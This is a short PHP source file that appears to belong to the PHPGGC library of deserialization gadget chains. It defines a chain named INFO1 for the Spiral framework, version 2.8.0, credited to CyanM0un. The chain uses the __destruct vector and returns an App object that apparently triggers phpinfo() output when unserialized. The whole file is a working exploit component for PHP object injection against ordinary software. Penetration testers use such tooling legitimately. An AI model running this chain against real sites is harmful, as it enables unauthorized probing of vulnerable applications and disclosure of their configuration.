<?php

namespace GadgetChain\Spiral;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '2.8.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \App\App();
    }
}
